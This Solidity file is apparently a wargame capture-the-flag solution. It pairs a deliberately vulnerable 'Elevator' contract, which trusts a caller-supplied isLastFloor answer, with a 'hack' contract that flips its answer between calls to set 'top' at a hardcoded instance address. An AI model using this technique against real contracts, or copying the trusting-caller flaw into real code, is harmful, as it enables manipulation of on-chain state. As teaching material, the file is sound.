pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract hack {
    address instance_address = 0x89fa2727ad30129f657994117323f7e15b3c626a;
    Elevator e = Elevator(instance_address);
    bool public flag = true;
    function isLastFloor(uint) public returns (bool){
        flag = !flag;
        return flag;
    }
    function exploit() public{
        e.goTo(123);
    }
}